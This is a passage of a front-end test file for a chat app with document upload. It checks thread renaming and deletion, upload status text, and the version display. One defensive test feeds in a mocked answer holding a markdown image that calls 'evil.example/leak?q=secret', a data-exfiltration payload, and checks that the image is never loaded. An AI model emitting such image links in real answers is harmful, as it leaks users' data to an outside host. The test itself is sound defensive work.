    expect(await within(threads).findByRole('link', { name: /Field team/ })).toBeTruthy()
    await vi.waitFor(() => expect(document.activeElement).toBe(within(threads).getByRole('button', { name: 'Rename Field team' })))
    expect(where()).toBe('/chat/session_1')  // renaming does not open the thread
  })

  it('deletes a thread with two clicks, and starts a new one when it was the open one', async () => {
    let listed = ['session_1', 'session_2']
    vi.mocked(api.getSessions).mockImplementation(async () => ({
      sessions: listed.map((session_id) => session({ session_id, title: `Thread ${session_id.slice(-1)}` })),
    }))
    vi.mocked(api.deleteSession).mockReset()
    vi.mocked(api.deleteSession).mockImplementation(async (session_id) => {
      listed = listed.filter((id) => id !== session_id)
      return { message: 'Conversation deleted', session_id }
    })
    const { addToast } = renderChat()
    const user = userEvent.setup()
    const threads = screen.getByRole('navigation', { name: 'Conversations' })

    // The first click only arms it
    await user.click(await within(threads).findByRole('button', { name: 'Delete Thread 2' }))
    expect(api.deleteSession).not.toHaveBeenCalled()
    const confirm = within(threads).getByRole('button', { name: 'Confirm deleting Thread 2' })
    expect(confirm.textContent).toBe('Delete?')
    await user.click(confirm)
    expect(api.deleteSession).toHaveBeenCalledWith('session_2')
    await vi.waitFor(() => expect(within(threads).queryByRole('link', { name: /Thread 2/ })).toBeNull())
    expect(addToast).toHaveBeenCalledWith('Conversation deleted', 'info')
    expect(where()).toBe('/chat/session_1')

    // The open thread: deleted, and a new one takes its place
    await user.click(within(threads).getByRole('button', { name: 'Delete Thread 1' }))
    await user.click(within(threads).getByRole('button', { name: 'Confirm deleting Thread 1' }))
    expect(api.deleteSession).toHaveBeenLastCalledWith('session_1')
    await vi.waitFor(() => expect(where()).toMatch(/^\/chat\/session_\d{6,}$/))
    expect(within(threads).getByText('No conversations yet')).toBeTruthy()
  })

  it('shows no tools row for an answer that did not come from the agent', async () => {
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('Every 90 days.')
      onDone?.(done({ sources: [SOURCE], confidence: 0.8, turn_id: 42 }))
    })
    renderChat()
    await ask('How often?')
    expect(await screen.findByText('Every 90 days.')).toBeTruthy()
    expect(screen.queryByText('Tools used')).toBeNull()
  })

  it('says whether an upload is being sent or being read', async () => {
    let accept: (reply: Awaited<ReturnType<typeof api.uploadDocument>>) => void = () => {}
    let read: (doc: Awaited<ReturnType<typeof api.getDocument>>) => void = () => {}
    vi.mocked(api.uploadDocument).mockImplementationOnce(() => new Promise((resolve) => { accept = resolve }))
    vi.mocked(api.getDocument).mockReset()
    vi.mocked(api.getDocument).mockImplementationOnce(() => new Promise((resolve) => { read = resolve }))
    const { addToast } = renderChat()
    const user = userEvent.setup()
    await user.upload(document.querySelector('input[type="file"]') as HTMLInputElement, new File(['%PDF'], 'plan.pdf', { type: 'application/pdf' }))
    expect(await screen.findByText('Sending plan.pdf')).toBeTruthy()
    expect(screen.getByText('Uploading the file')).toBeTruthy()

    await act(async () => accept({ document_id: 12, filename: 'plan.pdf', status: 'processing', replaces: false, message: "Reading 'plan.pdf'." }))
    expect(await screen.findByText('Reading plan.pdf')).toBeTruthy()
    expect(screen.getByText('Splitting it into passages')).toBeTruthy()

    await act(async () => read(documentStatus({ id: 12, filename: 'plan.pdf', status: 'ready', pages: 2, chunks: 5 })))
    await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith('Added plan.pdf: 5 passages from 2 pages.', 'success'))
    expect(screen.getByText('Add a document')).toBeTruthy()
  })

  it('shows the version, the same as the API\'s, under Settings, System', async () => {
    renderChat('/settings')
    const user = userEvent.setup()
    const sheet = await screen.findByRole('dialog', { name: 'Settings' })
    await user.click(within(sheet).getByRole('radio', { name: 'System' }))
    expect(screen.getByText('Version').previousElementSibling?.textContent).toBe(version)
    expect(version).toBe(snapshot.info.version)
  })

  it('says a file was removed before it was read, not that something failed', async () => {
    vi.mocked(api.uploadDocument).mockResolvedValue({ document_id: 13, filename: 'plan.pdf', status: 'processing', replaces: false, message: "Reading 'plan.pdf'." })
    vi.mocked(api.getDocument).mockReset()
    vi.mocked(api.getDocument).mockRejectedValue(new api.ApiError('No such document.', 404))
    const { addToast } = renderChat()
    const user = userEvent.setup()
    await user.upload(document.querySelector('input[type="file"]') as HTMLInputElement, new File(['%PDF'], 'plan.pdf', { type: 'application/pdf' }))
    await vi.waitFor(() => expect(addToast).toHaveBeenCalledWith('plan.pdf was removed before it was read.', 'info'))
    expect(addToast).not.toHaveBeenCalledWith('No such document.', 'error')
  })

  it('loads no image an answer names, and opens its links in a new tab (S3)', async () => {
    // Model output is untrusted: an image URL could carry text out, and a link in the same tab
    // would end the session held in memory
    vi.mocked(api.sendChatStream).mockImplementation(async ({ onToken, onDone }) => {
      onToken?.('See ![chart](https://evil.example/leak?q=secret) and [the manual](https://example.com/manual).')
      onDone?.(done({ sources: [SOURCE], confidence: 0.8, turn_id: 50 }))
    })
    renderChat()
    await ask('Show me')
    const link = await screen.findByRole('link', { name: 'the manual' })
    expect(link.getAttribute('target')).toBe('_blank')
    expect(link.getAttribute('rel')).toBe('noopener noreferrer')
    expect(document.querySelector('img')).toBeNull()
    expect(document.body.innerHTML).not.toContain('evil.example')
  })
})
